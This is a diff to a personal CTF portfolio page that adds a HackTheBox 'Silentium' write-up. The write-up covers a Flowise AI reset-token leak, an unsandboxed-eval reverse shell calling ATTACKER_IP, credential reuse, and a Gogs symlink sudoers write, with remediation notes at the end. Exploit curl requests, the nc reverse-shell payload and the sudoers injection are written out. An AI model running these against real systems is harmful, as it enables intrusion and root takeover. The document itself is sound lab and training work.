@@ -364,7 +364,7 @@
       </p>
       <div class="hero-stats">
         <div class="h-stat">
-          <span class="h-stat-val">1</span>
+          <span class="h-stat-val">2</span>
           <span class="h-stat-label">Machines Rooted</span>
         </div>
         <div class="stat-div"></div>
@@ -379,7 +379,7 @@
         </div>
       </div>
     </div>
-    <div id="hero-float" aria-hidden="true">01</div>
+    <div id="hero-float" aria-hidden="true">02</div>
   </section>
 
   <!-- WRITEUPS -->
@@ -429,6 +429,37 @@
         </div>
       </article>
 
+      <!-- Silentium -->
+      <article class="ctf-card" data-cat="web" onclick="openModal('silentium')">
+        <div class="card-top">
+          <div class="card-badges">
+            <span class="badge b-web">Web</span>
+            <span class="badge b-med">Medium</span>
+          </div>
+          <div class="card-status">
+            <span class="s-dot"></span>Rooted
+          </div>
+        </div>
+        <h3 class="card-title">Silentium</h3>
+        <p class="card-platform">HackTheBox &middot; Season 8 &middot; May 2026</p>
+        <p class="card-desc">Two-CVE chain: token leak in Flowise AI's password reset API &rarr; unsandboxed Node.js eval for RCE inside Docker &rarr; cleartext env credential for SSH &rarr; Gogs symlink arbitrary file write as root.</p>
+        <div class="card-tags">
+          <span class="tag">CVE-2025-58434</span>
+          <span class="tag">CVE-2025-8110</span>
+          <span class="tag">Flowise AI</span>
+          <span class="tag">Docker Escape</span>
+          <span class="tag">Gogs</span>
+          <span class="tag">PrivEsc</span>
+        </div>
+        <div class="card-footer">
+          <div class="card-meta">
+            <span>20 min</span>
+            <span>2 CVEs</span>
+          </div>
+          <span class="card-cta">Read Writeup &rarr;</span>
+        </div>
+      </article>
+
       <!-- Placeholder: Dancing -->
       <article class="ctf-card placeholder" data-cat="pwn">
         <div class="placeholder-inner">
@@ -436,7 +467,7 @@
             <svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" style="color:var(--muted)"><path d="M12 6v6m0 0v6m0-6h6m-6 0H6"/></svg>
           </div>
           <p style="font-family:'Fira Code',monospace;font-size:0.78rem;color:var(--muted)">More writeups coming soon...</p>
-          <p style="font-family:'Fira Code',monospace;font-size:0.68rem;color:rgba(0,255,136,0.35)">Currently working on: Dancing</p>
+          <p style="font-family:'Fira Code',monospace;font-size:0.68rem;color:rgba(0,255,136,0.35)">More writeups coming soon...</p>
         </div>
       </article>
 
@@ -619,6 +650,82 @@
 
     // MODAL DATA
     const writeups = {
+      silentium: {
+        title: 'Silentium', diff: 'Medium', diffCls: 'b-med',
+        body: `
+<div class="m-overview">
+  <div class="m-ov"><p>Machine</p><p>Silentium</p></div>
+  <div class="m-ov"><p>OS</p><p>Linux</p></div>
+  <div class="m-ov"><p>Difficulty</p><p style="color:#fbbf24">Medium</p></div>
+  <div class="m-ov"><p>Platform</p><p>HackTheBox</p></div>
+</div>
+<div class="m-sec">
+  <h4>// CVEs EXPLOITED</h4>
+  <div class="m-disc">
+    <p class="disc-title">CVE-2025-58434 &mdash; Flowise AI v3.0.5</p>
+    <ul><li>Unauthenticated API returns password reset <span class="acc">tempToken</span> in response body</li><li>No bruteforce needed — token handed to attacker directly</li><li>Severity: HIGH</li></ul>
+  </div>
+  <div class="m-disc">
+    <p class="disc-title">CVE-2025-8110 &mdash; Gogs Git Service</p>
+    <ul><li>Arbitrary file write via symlink through API</li><li>Gogs follows symlinks when updating file content via PUT endpoint</li><li>If Gogs runs as root: write anywhere on filesystem as root</li><li>Severity: CRITICAL</li></ul>
+  </div>
+</div>
+<div class="m-sec">
+  <h4>// 01. ENUMERATION</h4>
+  <p>Initial nmap scan: port 22 (SSH) and port 80 (nginx redirecting to <span class="acc">silentium.htb</span>). After adding to <span class="acc">/etc/hosts</span>, fuzzed for vhosts.</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>nmap -sV -sC &lt;TARGET_IP&gt;<br>22/tcp  open  ssh   OpenSSH 9.2<br>80/tcp  open  http  nginx &rarr; silentium.htb<br><br>gobuster vhost -u http://silentium.htb \\<br>  -w /usr/share/wordlists/dirb/common.txt \\<br>  --append-domain<br><br>Found: staging.silentium.htb  &larr; Flowise AI 3.0.5</div>
+  <p>Main domain was a fake finance company site. <span class="acc">staging.silentium.htb</span> was the real target — a live Flowise AI instance.</p>
+</div>
+<div class="m-sec">
+  <h4>// 02. INITIAL ACCESS — CVE-2025-58434</h4>
+  <p>POST to <span class="acc">/api/v1/account/forgot-password</span> with <span class="acc">ben@silentium.htb</span> — server responds with the full user object including the reset token. Token has a very short lifespan so both requests must be chained immediately.</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div># Step 1 — leak token<br>curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \\<br>  -H "Content-Type: application/json" \\<br>  -d '{"user": {"email": "ben@silentium.htb"}}'<br><br># Response contains:<br>{"tempToken": "eyJ...LEAKED", "tokenExpiry": ...}<br><br># Step 2 — use token immediately (flat payload required)<br>curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \\<br>  -H "Content-Type: application/json" \\<br>  -d '{"tempToken":"&lt;TOKEN&gt;","password":"Pwned1337!","confirmPassword":"Pwned1337!"}'</div>
+  <div class="m-good">&#10003; Logged into Flowise dashboard as admin (ben@silentium.htb)</div>
+</div>
+<div class="m-sec">
+  <h4>// 03. RCE — FLOWISE MCP UNSANDBOXED EVAL</h4>
+  <p>Flowise 3.0.5 evaluates the <span class="acc">mcpServerConfig</span> string directly in Node.js. Crafted a JavaScript IIFE using <span class="acc">process.mainModule.require('child_process')</span> to spawn a reverse shell.</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div># payload.json<br>{<br>  "loadMethod": "listActions",<br>  "inputs": {<br>    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&amp;1|nc ATTACKER_IP 4444 >/tmp/f');return 1;})()} )"<br>  }<br>}<br><br># fire it<br>nc -lvnp 4444  # listener<br>curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \\<br>  -H "Authorization: Bearer &lt;API_KEY&gt;" \\<br>  -H "Content-Type: application/json" \\<br>  -d @payload.json</div>
+  <div class="m-good">&#10003; Reverse shell as <span class="acc">node</span> inside Flowise Docker container</div>
+</div>
+<div class="m-sec">
+  <h4>// 04. CONTAINER ESCAPE &amp; LATERAL MOVEMENT</h4>
+  <p>Running <span class="acc">env</span> inside the container revealed a cleartext database password. Same credential reused for the host user <span class="acc">ben</span>.</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>env | grep -i pass<br>DATABASE_PASSWORD=&lt;cleartext_value&gt;<br><br>ssh ben@silentium.htb  # password reuse<br>cat /home/ben/user.txt  &rarr; HTB{user_flag}</div>
+  <div class="m-good">&#10003; User flag captured</div>
+</div>
+<div class="m-sec">
+  <h4>// 05. PRIVILEGE ESCALATION — CVE-2025-8110</h4>
+  <p>Gogs running internally on port 3000 as <span class="acc">root</span>. Port-forwarded via SSH, then exploited the symlink arbitrary file write to drop a sudoers entry for ben.</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div># port forward<br>ssh -L 8080:127.0.0.1:3000 ben@silentium.htb<br><br># clone repo, add symlink to sudoers target<br>git clone http://127.0.0.1:8080/attacker/repo.git<br>ln -s /etc/sudoers.d/ben malicious_link<br>git add malicious_link &amp;&amp; git commit -m "s" &amp;&amp; git push<br><br># write sudoers payload through symlink via API<br>curl -X PUT http://127.0.0.1:8080/api/v1/repos/attacker/repo/contents/malicious_link \\<br>  -H "Authorization: token &lt;API_TOKEN&gt;" \\<br>  -d '{"message":"x","content":"&lt;base64 of: ben ALL=(ALL) NOPASSWD: ALL\\n&gt;"}'</div>
+  <p>The trailing <span class="acc">\\n</span> in the sudoers payload is required — kernel won't parse the entry without it.</p>
+</div>
+<div class="m-sec">
+  <h4>// 06. ROOT</h4>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>ben@silentium:~$ sudo id<br>uid=0(root) gid=0(root) groups=0(root)<br><br>ben@silentium:~$ sudo cat /root/root.txt<br>7a4a0316f8faed5f786a5febcfcd0040</div>
+  <div class="m-good">&#10003; Root flag: 7a4a0316f8faed5f786a5febcfcd0040 — Machine owned.</div>
+</div>
+<div class="m-sec">
+  <h4>// LESSONS LEARNED</h4>
+  <ul class="m-list">
+    <li>Never return reset tokens in API responses — deliver out-of-band only</li>
+    <li>eval() on user input in Node.js without a VM sandbox is always RCE</li>
+    <li>Secrets in Docker env vars are visible to anyone with a shell — use Vault or Docker secrets</li>
+    <li>Don't share DB passwords with system account passwords</li>
+    <li>Never run Gogs, Gitea, or any git service as root</li>
+    <li>Symlink path traversal: validate resolved paths stay within repo root before writing</li>
+  </ul>
+</div>
+<div class="m-bad">
+  <h5>Remediation</h5>
+  <ul class="m-list">
+    <li>Flowise: deliver tokens via email only, never in API response</li>
+    <li>Flowise: sandbox MCP config evaluation with isolated-vm or remove eval entirely</li>
+    <li>Docker: use secrets management, rotate credentials, enforce unique passwords</li>
+    <li>Gogs: run as dedicated low-privilege user, validate symlink targets before writes</li>
+  </ul>
+</div>`
+      },
       kobold: {
         title: 'kobold', diff: 'Easy', diffCls: 'b-easy',
         body: `
